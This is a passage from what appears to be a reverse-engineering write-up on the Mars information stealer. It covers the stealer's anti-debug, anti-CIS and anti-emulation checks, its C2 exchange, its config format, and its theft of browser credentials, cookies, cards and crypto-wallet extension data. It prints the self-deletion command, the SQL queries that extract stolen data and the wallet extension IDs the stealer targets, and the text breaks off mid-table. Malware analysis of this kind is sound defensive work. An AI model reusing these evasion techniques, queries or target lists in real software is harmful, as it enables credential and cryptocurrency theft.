Authenticator'</span><span class="p">,</span> <span class="s">'imloifkgjagghnncjkhggdhalmcnfklk'</span><span class="p">,</span> <span class="s">'Trezor Password Manager'</span><span class="p">,</span> <span class="s">'%s</span><span class="se">\\</span><span class="s">%s</span><span class="se">\\</span><span class="s">Local Extension Settings</span><span class="se">\\</span><span class="s">%s'</span><span class="p">,</span> <span class="s">'%s</span><span class="se">\\</span><span class="s">CURRENT'</span><span class="p">,</span> <span class="s">'%s</span><span class="se">\\</span><span class="s">%s</span><span class="se">\\</span><span class="s">Sync Extension Settings</span><span class="se">\\</span><span class="s">%s'</span><span class="p">,</span> <span class="s">'%s</span><span class="se">\\</span><span class="s">%s</span><span class="se">\\</span><span class="s">IndexedDB</span><span class="se">\\</span><span class="s">chrome-extension_%s_0.indexeddb.leveldb'</span><span class="p">,</span> <span class="s">'Plugins</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> <span class="s">'HARDWARE</span><span class="se">\\</span><span class="s">DESCRIPTION</span><span class="se">\\</span><span class="s">System</span><span class="se">\\</span><span class="s">CentralProcessor</span><span class="se">\\</span><span class="s">0'</span><span class="p">,</span> <span class="s">'ProcessorNameString'</span><span class="p">,</span> <span class="s">'SOFTWARE</span><span class="se">\\</span><span class="s">Microsoft</span><span class="se">\\</span><span class="s">Windows NT</span><span class="se">\\</span><span class="s">CurrentVersion'</span><span class="p">,</span> <span class="s">'ProductName'</span><span class="p">,</span> <span class="s">'x64'</span><span class="p">,</span> <span class="s">'x86'</span><span class="p">,</span> <span class="s">'DISPLAY'</span><span class="p">,</span> <span class="s">'SOFTWARE</span><span class="se">\\</span><span class="s">Microsoft</span><span class="se">\\</span><span class="s">Cryptography'</span><span class="p">,</span> <span class="s">'MachineGuid'</span><span class="p">,</span> <span class="s">'SOFTWARE</span><span class="se">\\</span><span class="s">Microsoft</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">CurrentVersion</span><span class="se">\\</span><span class="s">Uninstall'</span><span class="p">,</span> <span class="s">'DisplayName'</span><span class="p">,</span> <span class="s">'DisplayVersion'</span><span class="p">,</span> <span class="s">'screenshot.jpg'</span><span class="p">,</span> <span class="s">'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'</span><span class="p">,</span> <span class="s">'/c timeout /t 5 &amp; del /f /q "%s" &amp; exit'</span><span class="p">,</span> <span class="s">'C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">System32</span><span class="se">\\</span><span class="s">cmd.exe'</span><span class="p">]</span>
<span class="k">for</span> <span class="n">String</span> <span class="ow">in</span> <span class="n">Decrypted_Strings</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="n">String</span><span class="p">)</span>
</code></pre></div></div>

<p>The adress of <code class="language-plaintext highlighter-rouge">GetProcAddress()</code> and <code class="language-plaintext highlighter-rouge">LoadLibraryA()</code>  is retrieved by the same method in Dynamic_Linking_1  looping over the exported functions of the kernel32.DLL , then it uses  <code class="language-plaintext highlighter-rouge">LoadLibraryA()</code> to Load the specified module into the address space and get a handle and passes it to  <code class="language-plaintext highlighter-rouge">GetProcAddress()</code> to retrieve the address of an exported function from the specified dynamic-link library.  Dynamic_Linking_2 is loading the APIs only needed to do some checks if it passes it will load others needed for stealing functionality.
<img src="attachment:11-2.PNG" alt="11-2.PNG" /></p>

<p>dword_42774 is <code class="language-plaintext highlighter-rouge">GetProcAddress()</code> it is called in other function which is Dynamic_Linking_3 that will load other APIs needed for stealing functionality.
<img src="attachment:12.PNG" alt="12.PNG" /></p>

<p>We use idapython to rename the variables with the api name to make reversing easier
<img src="attachment:13-2.PNG" alt="13-2.PNG" /></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">idc</span>

<span class="n">start_Addrs</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x00415F86</span><span class="p">,</span><span class="mh">0x00415FC0</span> <span class="p">,</span><span class="mh">0x004161A0</span> <span class="p">]</span>
<span class="n">end_Addrs</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x00415FB7</span><span class="p">,</span><span class="mh">0x00416176</span><span class="p">,</span><span class="mh">0x00417034</span><span class="p">]</span>

<span class="n">string_list</span> <span class="o">=</span> <span class="p">[]</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">start_Addrs</span><span class="p">)):</span>
    <span class="n">ea</span> <span class="o">=</span> <span class="n">start_Addrs</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
    <span class="n">end</span> <span class="o">=</span> <span class="n">end_Addrs</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>

    <span class="k">while</span> <span class="n">ea</span> <span class="o">&lt;=</span> <span class="n">end</span><span class="p">:</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">idc</span><span class="p">.</span><span class="n">print_insn_mnem</span><span class="p">(</span><span class="n">ea</span><span class="p">)</span> <span class="o">==</span> <span class="s">"push"</span>  <span class="p">)</span><span class="ow">and</span> <span class="p">(</span><span class="n">idc</span><span class="p">.</span><span class="n">get_operand_type</span><span class="p">(</span><span class="n">ea</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="n">idc</span><span class="p">.</span><span class="n">o_imm</span><span class="p">):</span>
            <span class="n">name</span> <span class="o">=</span> <span class="n">idc</span><span class="p">.</span><span class="n">get_strlit_contents</span><span class="p">(</span><span class="n">idc</span><span class="p">.</span><span class="n">get_operand_value</span><span class="p">(</span><span class="n">ea</span><span class="p">,</span> <span class="mi">0</span><span class="p">)).</span><span class="n">decode</span><span class="p">()</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">idc</span><span class="p">.</span><span class="n">print_insn_mnem</span><span class="p">(</span><span class="n">ea</span><span class="p">)</span> <span class="o">==</span> <span class="s">"mov"</span>  <span class="ow">and</span> <span class="p">(</span><span class="n">idc</span><span class="p">.</span><span class="n">get_operand_type</span><span class="p">(</span><span class="n">ea</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="n">idc</span><span class="p">.</span><span class="n">o_reg</span><span class="p">)</span><span class="ow">and</span> <span class="p">(</span><span class="n">idc</span><span class="p">.</span><span class="n">get_operand_type</span><span class="p">(</span><span class="n">ea</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="n">idc</span><span class="p">.</span><span class="n">o_mem</span><span class="p">))</span> <span class="p">:</span>
            <span class="n">temp_name</span> <span class="o">=</span> <span class="n">idc</span><span class="p">.</span><span class="n">get_name</span><span class="p">(</span><span class="n">idc</span><span class="p">.</span><span class="n">get_operand_value</span><span class="p">(</span><span class="n">ea</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span>
            <span class="k">if</span> <span class="s">"Str_"</span> <span class="o">==</span> <span class="n">temp_name</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">4</span><span class="p">]:</span>
                <span class="n">name</span> <span class="o">=</span> <span class="n">temp_name</span><span class="p">[</span><span class="mi">4</span><span class="p">::]</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">idc</span><span class="p">.</span><span class="n">print_insn_mnem</span><span class="p">(</span><span class="n">ea</span><span class="p">)</span> <span class="o">==</span> <span class="s">"mov"</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">idc</span><span class="p">.</span><span class="n">get_operand_type</span><span class="p">(</span><span class="n">ea</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="n">idc</span><span class="p">.</span><span class="n">o_mem</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">idc</span><span class="p">.</span><span class="n">get_operand_type</span><span class="p">(</span><span class="n">ea</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="n">idc</span><span class="p">.</span><span class="n">o_reg</span><span class="p">):</span>
            <span class="n">global_var</span> <span class="o">=</span> <span class="n">idc</span><span class="p">.</span><span class="n">get_operand_value</span><span class="p">(</span><span class="n">ea</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
            <span class="n">idc</span><span class="p">.</span><span class="n">set_name</span><span class="p">(</span><span class="n">global_var</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">SN_NOWARN</span><span class="p">)</span>

        <span class="n">ea</span> <span class="o">=</span> <span class="n">idc</span><span class="p">.</span><span class="n">next_head</span><span class="p">(</span><span class="n">ea</span><span class="p">,</span> <span class="n">end</span><span class="p">)</span>
</code></pre></div></div>

<h1 id="timing-based-anti-debug">Timing-based anti-debug</h1>

<p>Calling  <code class="language-plaintext highlighter-rouge">GetTickCount()</code> function that retrieves the number of milliseconds that have elapsed since the system was started, up to 49.7 days. Then calls the <code class="language-plaintext highlighter-rouge">Sleep()</code> to suspend the execution for 16 seconds. calling <code class="language-plaintext highlighter-rouge">GetTickCount()</code> again gets the time and malware uses the first result to subtract then checks if a gotten number is greater than 12000 milliseconds (12 seconds). If the function returns true it means that the Sleep() hasn’t been skipped by the debugger and malware continues execution flow.
<img src="attachment:15-2.PNG" alt="15-2.PNG" /></p>

<h1 id="anti-cis">Anti-CIS</h1>

<p>This is one of the easy tricks to check if the malware is not infected users from specific countries.</p>

<p><img src="attachment:16.PNG" alt="16.PNG" /></p>

<p>mars checks the user language to determine if it’s part of the Commonwealth of Independent States (CIS) countrie it gets the user language ID by using GetUserDefaultLangID and it compares the user language ID to:</p>

<table>
  <thead>
    <tr>
      <th>Language ID</th>
      <th>Country</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>0x43F</td>
      <td>Kazakhstan</td>
    </tr>
    <tr>
      <td>0x443</td>
      <td>Uzbekistan</td>
    </tr>
    <tr>
      <td>0x82C</td>
      <td>Azerbaijan</td>
    </tr>
    <tr>
      <td>0x43Fu</td>
      <td>Kazakhstan</td>
    </tr>
    <tr>
      <td>0x419u</td>
      <td>Russia</td>
    </tr>
    <tr>
      <td>0x423u</td>
      <td>Belarus</td>
    </tr>
  </tbody>
</table>

<p>If the user language ID matches one of the IDs above, the stealer will exit.</p>

<h1 id="anti-emulation">Anti-emulation</h1>

<p>If the malware is executed with the computer name <code class="language-plaintext highlighter-rouge">HAL9TH</code>  and the username with <code class="language-plaintext highlighter-rouge">JohnDoe</code>   it will terminate its execution chain. This computer name check is done because it is the name given to the Windows Defender Emulator; this technique is used by malware to prevent itself from running in an emulated environment.</p>

<p><img src="attachment:17-3.PNG" alt="17-3.PNG" /></p>

<h1 id="mutex">Mutex</h1>

<p>the malware creates a mutex object using <code class="language-plaintext highlighter-rouge">CreateMutexA()</code> to avoid having more than one instance running.  Then calls<code class="language-plaintext highlighter-rouge"> GetLastError() </code>which gets the last error, and if the error code is equal to 183 (ERROR_ALREADY_EXIST) it means that mutex already exists and an instance of the malware is already running therefore malware finishes execution.
<img src="attachment:18.PNG" alt="18.PNG" /></p>

<h1 id="debug-flag-anti-debug">Debug Flag anti-debug</h1>

<p>The malware create thread that checks beingdebugged flag which is Special flag in system tables, which dwell in process memory and which an operation system sets, can be used to indicate that the process is being debugged. The states of these flags can be verified either by using specific API functions or examining the system tables in memory. if the malware is being debugged it 
 finishes execution. The thread is going to keep running until the malware finishes excution or the thread end the malware excution if its being debugged .
<img src="attachment:19-3.PNG" alt="19-3.PNG" /></p>

<p><img src="attachment:20-4.PNG" alt="20-4.PNG" /></p>

<p><img src="attachment:21.PNG" alt="21.PNG" /></p>

<p><img src="attachment:22.PNG" alt="22.PNG" /></p>

<h1 id="expiration-check">Expiration check</h1>

<p>The Expiration_date variable contains 26/04/2022 20:00:00.</p>

<p>Mars uses <code class="language-plaintext highlighter-rouge">GetSystemTime()</code> to get current system date and time as SYSTEMTIME structe, then calls sscanf() to parse the Expiration date to a SYSTEMTIME structe . <code class="language-plaintext highlighter-rouge">SystemTimeToFileTime()</code> take SYSTEMTIME structe as argument then convert it to file time [ Contains a 64-bit value representing the number of 100-nanosecond intervals since January 1, 1601 (UTC) ]
and Expiration  date although.</p>

<p>If the current time exceedes the Expiration time, the malware calls <code class="language-plaintext highlighter-rouge">ExitProcess()</code> to finish the process.</p>

<p><img src="attachment:24-2.PNG" alt="24-2.PNG" /></p>

<p><img src="attachment:40.PNG" alt="40.PNG" /></p>

<p><img src="attachment:41.PNG" alt="41.PNG" /></p>

<p><img src="attachment:42.PNG" alt="42.PNG" /></p>

<h1 id="main-malware-functionality">Main Malware Functionality</h1>

<p><img src="attachment:48-2.PNG" alt="48-2.PNG" /></p>

<p><img src="attachment:49-2.PNG" alt="49-2.PNG" /></p>

<p>Mars generate random string that will be the name of the zip file contains stolen data.</p>

<p>The communications between c2 and the malware is described as:</p>
<ol>
  <li>sends a GET request to the C2 URL on the <code class="language-plaintext highlighter-rouge">/RyC66VfSGP.php</code> endpoint to grab its configuration .</li>
  <li>fetches all DLLs on the <code class="language-plaintext highlighter-rouge">/request</code> endpoint, the libraries are zipped</li>
  <li>Stolen data are posted to the C2 on the same URL used in step.</li>
</ol>

<p>Dlls retrieved:</p>

<table>
  <thead>
    <tr>
      <th>DLL Name</th>
      <th>Description</th>
      <th>Save path</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>sqlite3.dll</td>
      <td>Enables SQLite related operations</td>
      <td>none (mars doesnt write it to the disk, parsed from memory)</td>
    </tr>
    <tr>
      <td>freebl3.dll</td>
      <td>Library for the NSS (Gecko-based browsers)</td>
      <td>C:\ProgramData\freebl3.dll</td>
    </tr>
    <tr>
      <td>mozglue.dll</td>
      <td>Mozilla Browser Library</td>
      <td>C:\ProgramData\mozglue.dll</td>
    </tr>
    <tr>
      <td>msvcp140.dll</td>
      <td>Visual C++ Runtime 2015</td>
      <td>C:\ProgramData\msvcp140.dll</td>
    </tr>
    <tr>
      <td>nss3.dll</td>
      <td>Network System Services Library (Gecko-based browsers)</td>
      <td>C:\ProgramData\nss3.dll</td>
    </tr>
    <tr>
      <td>softokn3.dll</td>
      <td>Mozilla Browser Library</td>
      <td>C:\ProgramData\softokn3.dll</td>
    </tr>
    <tr>
      <td>vcruntime140.dll</td>
      <td>Visual C++ Runtime 2015</td>
      <td>C:\ProgramData\vcruntime140.dll</td>
    </tr>
  </tbody>
</table>

<p>Another diffrence from the last version is that sqlite3 isnt written on disk, it just get parsed and passed to another function to get handle to it and start loading needed function , the other dll are written . 
<img src="attachment:52.PNG" alt="52.PNG" /></p>

<p><img src="attachment:26.PNG" alt="26.PNG" /></p>

<p><img src="attachment:50.PNG" alt="50.PNG" /></p>

<h1 id="understanding-configuration-format">Understanding configuration Format</h1>
<p>configuration is base64 encoded</p>
<blockquote>
  <p>MXwxfDF8MXwxfDVxRGxQdVZLb1J8RGlzY29yZHwwfCVBUFBEQVRBJVxkaXNjb3JkXExvY2FsIFN0b3JhZ2VcfCp8MXwwfDB8VGVsZWdyYW18MHwlQVBQREFUQSVcVGVsZWdyYW0gRGVza3RvcFx0ZGF0YVx8KkQ4NzdGNzgzRDVEM0VGOEMqLCptYXAqLCpjb25maWdzKnwxfDB8MHw=</p>
</blockquote>

<blockquote>
  <table>
    <tbody>
      <tr>
        <td>1</td>
        <td>1</td>
        <td>1</td>
        <td>1</td>
        <td>1</td>
        <td>5qDlPuVKoR</td>
        <td>Discord</td>
        <td>0</td>
        <td>%APPDATA%\discord\Local Storage|*</td>
        <td>1</td>
        <td>0</td>
        <td>0</td>
        <td>Telegram</td>
        <td>0</td>
        <td>%APPDATA%\Telegram</td>
      </tr>
      <tr>
        <td>Desktop\tdata|<em>D877F783D5D3EF8C</em>,<em>map</em>,<em>configs</em></td>
        <td>1</td>
        <td>0</td>
        <td>0</td>
        <td> </td>
        <td> </td>
        <td> </td>
        <td> </td>
        <td> </td>
        <td> </td>
        <td> </td>
        <td> </td>
        <td> </td>
        <td> </td>
        <td> </td>
      </tr>
    </tbody>
  </table>
</blockquote>

<ul>
  <li>First part</li>
</ul>

<table>
  <thead>
    <tr>
      <th>Config</th>
      <th>Meaning</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>1</td>
      <td>Downloads_history_Flag</td>
    </tr>
    <tr>
      <td>1</td>
      <td>Browser_History_Flag</td>
    </tr>
    <tr>
      <td>1</td>
      <td>Autofill_Flag</td>
    </tr>
    <tr>
      <td>1</td>
      <td>ScreenShoot_Flag</td>
    </tr>
    <tr>
      <td>1</td>
      <td>Self_Deletion_Flag</td>
    </tr>
    <tr>
      <td>5qDlPuVKoR</td>
      <td>Explorer credentials FileName</td>
    </tr>
  </tbody>
</table>

<ul>
  <li>Second part</li>
</ul>

<table>
  <thead>
    <tr>
      <th>Config</th>
      <th>Meaning</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Discord</td>
      <td>name for the zip file – will contain all the stolen files that related to the current task. Oski concatenates to this name an underscore at the beginning, so the name for the zip will be name.zip.</td>
    </tr>
    <tr>
      <td>0</td>
      <td>max size (no indecation of use)</td>
    </tr>
    <tr>
      <td>%APPDATA%\discord\Local Storage|An environment variable name and folder name – a starting point for the recursive Grabber.</td>
      <td> </td>
    </tr>
    <tr>
      <td>*</td>
      <td>A regex list – contains multiply parameters that are separated by “,” each one of them is a regex that represents a file type.</td>
    </tr>
    <tr>
      <td>1</td>
      <td>is_Recursive</td>
    </tr>
    <tr>
      <td>0</td>
      <td>Write to zip enabled if 0</td>
    </tr>
    <tr>
      <td>0</td>
      <td>Exclusion List</td>
    </tr>
  </tbody>
</table>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">config</span> <span class="o">=</span> <span class="s">"1|1|1|1|1|5qDlPuVKoR|Discord|0|%APPDATA%\discord\Local Storage\|*|1|0|0|Telegram|0|%APPDATA%\Telegram Desktop</span><span class="se">\t</span><span class="s">data\|*D877F783D5D3EF8C*,*map*,*configs*|1|0|0"</span>
<span class="n">config</span> <span class="o">=</span> <span class="n">config</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"|"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"First Part : </span><span class="se">\n</span><span class="s">"</span> <span class="p">,</span><span class="n">config</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">6</span><span class="p">])</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Second Part :"</span> <span class="p">)</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">config</span><span class="p">),</span><span class="mi">7</span><span class="p">):</span>
    <span class="k">print</span><span class="p">(</span><span class="n">config</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">7</span><span class="p">])</span>
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>First Part : 
 ['1', '1', '1', '1', '1', '5qDlPuVKoR']
Second Part :
['Discord', '0', '%APPDATA%\\discord\\Local Storage\\', '*', '1', '0', '0']
['Telegram', '0', '%APPDATA%\\Telegram Desktop\tdata\\', '*D877F783D5D3EF8C*,*map*,*configs*', '1', '0', '0']
</code></pre></div></div>

<p>lets dig into <code class="language-plaintext highlighter-rouge">Config_Grabber</code> function to see how you it works</p>

<p>after receiving the config we can see the it has a lot of <code class="language-plaintext highlighter-rouge">|</code> so it split the config with <code class="language-plaintext highlighter-rouge">|</code> delimiter and loop through the splited Config.
the first part enables/disable some of the stealer functionality then it starts in part 2 which start grapping files wanted.</p>

<p>as example lets understand what this config does
[‘Discord’, ‘0’, ‘%APPDATA%\discord\Local Storage\’, ‘*’, ‘1’, ‘0’, ‘0’], it start recurseively grabbing all files starting from that <code class="language-plaintext highlighter-rouge">%APPDATA%\\discord\\Local Storage\\</code> path and put them in discord.zip</p>

<p><img src="attachment:30-3.PNG" alt="30-3.PNG" /></p>

<p><img src="attachment:31-3.PNG" alt="31-3.PNG" /></p>

<p><img src="attachment:32.PNG" alt="32.PNG" /></p>

<p><img src="attachment:33-2.PNG" alt="33-2.PNG" /></p>

<p>If there is more than one regex as in  [‘Telegram’, ‘0’, ‘%APPDATA%\Telegram Desktop\tdata\’, ‘<em>D877F783D5D3EF8C</em>,<em>map</em>,<em>configs</em>’, ‘1’, ‘0’, ‘0’]  , it loops through them and call <code class="language-plaintext highlighter-rouge">Recursive_Grabber</code> with each regex .</p>

<p><img src="attachment:34-4.PNG" alt="34-4.PNG" /></p>

<h1 id="stealing-functionallity">Stealing functionallity</h1>

<p>Mars steals credentials from browsers by static paths. It has four different methods to steal data from different types of browses, like Gecko-based browsers, Opera, Internet Explorer and Chromium-based browsers.</p>

<p><img src="attachment:43-2.PNG" alt="43-2.PNG" /></p>

<p><img src="attachment:44.PNG" alt="44.PNG" /></p>

<p><img src="attachment:45-2.PNG" alt="45-2.PNG" /></p>

<p><img src="attachment:46-3.PNG" alt="46-3.PNG" /></p>

<p>Data Extraction</p>

<p>All the extraction functions have the same scheme:</p>
<ol>
  <li>The malware saves the addresses of the functions from sqlite3.dll
    <ul>
      <li>sqlite3_open</li>
      <li>sqlite3_prepare_v2</li>
      <li>sqlite3_step</li>
      <li>sqlite3_column_bytes</li>
      <li>sqlite3_column_blob</li>
      <li>sqlite3_column_text</li>
      <li>sqlite3_column_finalize</li>
      <li>sqlite3_column_close</li>
    </ul>
  </li>
  <li>It generates a random string (length of 8 characters) and copies the DB file to a temp folder named like the random
string – all the extractions methods will be on the copied DB.
In order to extract the data from the DB, the malware has to create the SQL query and query the DB using sqlite3.dll functions.</li>
  <li>The malware opens the DB by using sqlite3_open and passes the DB path.</li>
  <li>It calls to sqlite3_prepare_v2, the function gets a handle to DB and the SQL query and returns a statement handle.</li>
  <li>By using sqlite3_column_bytes/sqlite3_column_blob/sqlite3_column_text, the malware can get the results from the queries</li>
  <li>The Credentials in Chromium-based browsers DB are encrypted by DPAPI and, therefore, the malware uses the function CryptUnprotectData to decrypt the Credentials.</li>
</ol>

<p>Mars steals information from the Windows Vault, which is the default storage vault for the credential manager information. This is done through the use of Vaultcli.dll, which encapsulates the necessary functions to access the Vault. Internet Explorer data, since it’s version 10, is stored in the Vault. The malware loops through its items using:</p>

<ul>
  <li>VaultEnumerateVaults</li>
  <li>VaultOpenVault</li>
  <li>VaultEnumerateItems</li>
  <li>VaultGetItem</li>
  <li>VaultFree</li>
</ul>

<h3 id="targeted-db-files">Targeted DB Files</h3>
<p>|File Name|	Affected Software|
|—|—|
|History |Chromium-based browsers|
|Login Data |Chromium-based browsers|
|Cookies	 | Chromium-based browsers|
|Web Data	|Chromium-based browsers|
|formhistory.sqlite|	Gecko-based browsers|
|cookies.sqlite	|Gecko-based browsers|
|signongs.sqlite|	Gecko-based browsers|
|places.sqlite|	Gecko-based browsers|</p>

<h3 id="queries-used">Queries Used</h3>

<table>
  <thead>
    <tr>
      <th>Query</th>
      <th>Target Browser</th>
      <th>Enabled</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>SELECT target_path, tab_url from downloads</td>
      <td>chromium , opera</td>
      <td>by default this feature is disabled,  enabled if Downloads_history_Flag is set to 1</td>
    </tr>
    <tr>
      <td>SELECT name, value FROM autofill</td>
      <td>chromium , opera</td>
      <td>by default this feature is disabled, enabled if Autofill_Flag is set to 1</td>
    </tr>
    <tr>
      <td>SELECT url FROM urls</td>
      <td>chromium , opera</td>
      <td>by default this feature is disabled,enabled if Browser_History_Flag is set to 1</td>
    </tr>
    <tr>
      <td>SELECT action_url, username_value, password_value FROM logins</td>
      <td>chromium , opera</td>
      <td>enabled by default</td>
    </tr>
    <tr>
      <td>SELECT HOST_KEY, is_httponly, path, is_secure, (expires_utc/1000000)-11644480800, name, encrypted_value from cookies</td>
      <td>chromium , opera</td>
      <td>enabled by default</td>
    </tr>
    <tr>
      <td>SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards</td>
      <td>chromium , opera</td>
      <td>enabled by default</td>
    </tr>
    <tr>
      <td>SELECT host, isHttpOnly, path, isSecure, expiry, name, value FROM moz_cookies</td>
      <td>gecko</td>
      <td>enabled by default</td>
    </tr>
    <tr>
      <td>SELECT url FROM moz_places</td>
      <td>gecko</td>
      <td>by default this feature is disabled,enabled if Browser_History_Flag is set to 1</td>
    </tr>
    <tr>
      <td>SELECT fieldname, value FROM moz_formhistory</td>
      <td>gecko</td>
      <td>enabled by default</td>
    </tr>
  </tbody>
</table>

<h1 id="cryptocurrency-wallets-via-browser-extensions">Cryptocurrency Wallets via browser extensions</h1>

<p>Mars appears to also target additional Chrome-based browser extensions related to two-factor authentication (2FA) .</p>

<p><img src="attachment:51.PNG" alt="51.PNG" />
if the victim uses Google Chrome with a crypto browser wallet extension, the extension files will be stored in:</p>

<p>C:\Users\Username\AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings\Extension ID from Google Store
C:\Users\Username\AppData\Local\Google\Chrome\User Data\Default\Sync Extension Settings\ Extension ID from Google Store
C:\Users\Username\AppData\Local\Google\Chrome\User Data\Default\IndexedDB\Domain Name.indexeddb.leveldb</p>

<table>
  <thead>
    <tr>
      <th>Type</th>
      <th>Extension name</th>
      <th>Extension id</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Crypto</td>
      <td>TronLink</td>
      <td>ibnejdfjmmkpcnlpebklmnkoeoihofec</td>
    </tr>
    <tr>
      <td>Crypto</td>
      <td>MetaMask</td>
      <td>nkbihfbeogaeaoehlefnkodbefgpgknn</td>
    </tr>
    <tr>
      <td>Crypto</td>
      <td>Binance Chain Wallet</td>
      <td>fhbohimaelbohpjbbldcngcnapndodjp</td>
    </tr>
    <tr>
      <td>Crypto</td>
      <td>Yoroi</td>
      <td>ffnbelfdoeiohenkjibnmadjiehjhajb</td>
    </tr>
    <tr>
      <td>Crypto</td>
      <td>Nifty Wallet</td>
      <td>jbdaocneiiinmjbjlgalhcelgbejmnid</td>
    </tr>
    <tr>
      <td>Crypto</td>
      <td>Math Wallet</td>
      <td>afbcbjpbpfadlkmhmclhkeeodmamcflc</td>
    </tr>
    <tr>
      <td>Crypto</td>
      <td>Coinbase Wallet</td>
      <td>hnfanknocfeofbddgcijnmhnfnkdnaad</td>
    </tr>
    <tr>
      <td>Crypto</td>
      <td>Guarda</td>
      <td>hpglfhgfnhbgpjdenjgmdgoeiappafln</td>
    </tr>
    <tr>
      <td>Crypto</td>
      <td>EQUAL Wallet</td>
      <td>blnieiiffboillknjnepogjhkgnoapac</td>
    </tr>
    <tr>
      <td>Crypto</td>
      <td>Jaxx Liberty</td>
      <td>cjelfplplebdjjenllpjcblmjkfcffne</td>
    </tr>
    <tr>
      <td>Crypto</td>
      <td>BitApp Wallet</td>
      <td>fihkakfobkmkjojpchpfgcmhfjnmnfpi</td>
    </tr>
    <tr>
      <td>Crypto</td>
      <td>iWallet</td>
      <td>kncchdigobghenbbaddojjnnaogfppfj</td>
    </tr>
    <tr>
      <td>Crypto</td>
      <td>Wombat</td>
      <td>amkmjjmmflddogmhpjloimipbofnfjih</td>
    </tr>
    <tr>
      <td>Crypto</td>
      <td>MEW CX</td>
      <td>nlbmnnijcnlegkjjpcfjclmcfggfefdm</td>
    </tr>
    <tr>
      <td>Crypto</td>
      <td>GuildWallet</td>
      <td>nanjmdknhkinifnkgdcggcfnhdaammmj</td>
    </tr>
    <tr>
      <td>Crypto</td>
      <td>Saturn Wallet</td>
      <td>nkddgncdjgjfcddamfgcmfnlhccnimig</td>
    </tr>
    <tr>
      <td>Crypto</td>
      <td>Ronin Wallet</td>
      <td>fnjhmkhhmkbjkkabndcnnogagogbneec</td>
    </tr>
    <tr>
      <td>Crypto</td>
      <td>NeoLine</td>
      <td>cphhlgmgameodnhkjdmkpanlelnlohao</td>
    </tr>
    <tr>
      <td>Crypto</td>
      <td>Clover Wallet</td>
      <td>nhnkbkgjikgcigadomkphalanndcapjk</td>
    </tr>
    <tr>
      <td>Crypto</td>
      <td>Liquality Wallet</td>
      <td>kpfopkelmapcoipemfendmdcghnegimn</td>
    </tr>
    <tr>
      <td>Crypto</td>
      <td>Terra Station</td>
      <td>aiifbnbfobpmeekipheeijimdpnlpgpp</td>
    </tr>
    <tr>
      <td>Crypto</td>
      <td>Keplr</td>
      <td>dmkamcknogkgcdfhhbddcghachkejeap</td>
    </tr>
    <tr>
      <td>Crypto</td>
      <td>Sollet</td>
      <td>fhmfendgdocmcbmfikdcogofphimnkno</td>
    </tr>
    <tr>
      <td>Crypto</td>
      <td>Auro Wallet</td>
      <td>cnmamaachppnkjgnildpdmkaakejnhae</td>
    </tr>
    <tr>
      <td>Crypto</td>
      <td>Polymesh Wallet</td>
      <td>jojhfeoedkpkglbfimdfabpdfjaoolaf</td>
    </tr>
    <tr>
      <td>Crypto</td>
      <td>ICONex</td>
      <td>flpiciilemghbmfalicajoolhkkenfel</td>
    </tr>
    <tr>
      <td>Crypto</td>
      <td>Nabox Wallet</td>
      <td>nknhiehlklippafakaeklbeglecifhad</td>
    </tr>
    <tr>
      <td>Crypto</td>
      <td>KHC</td>
      <td>hcflpincpppdclinealmandijcmnkbgn</td>
    </tr>
    <tr>
      <td>Crypto</td>
      <td>Temple</td>
      <td>ookjlbkiijinhpmnjffcofjonbfbgaoc</td>
    </tr>
    <tr>
      <td>Crypto</td>
      <td>TezBox</td>
      <td>mnfifefkajgofkcjkemidiaecocnkjeh</td>
    </tr>
    <tr>
      <td>Crypto</td>
      <td>Cyano Wallet</td>
      <td>dkdedlpgdmmkkfjabffeganieamfklkm</td>
    </tr>
    <tr>
      <td>Crypto</td>
      <td>Byone</td>
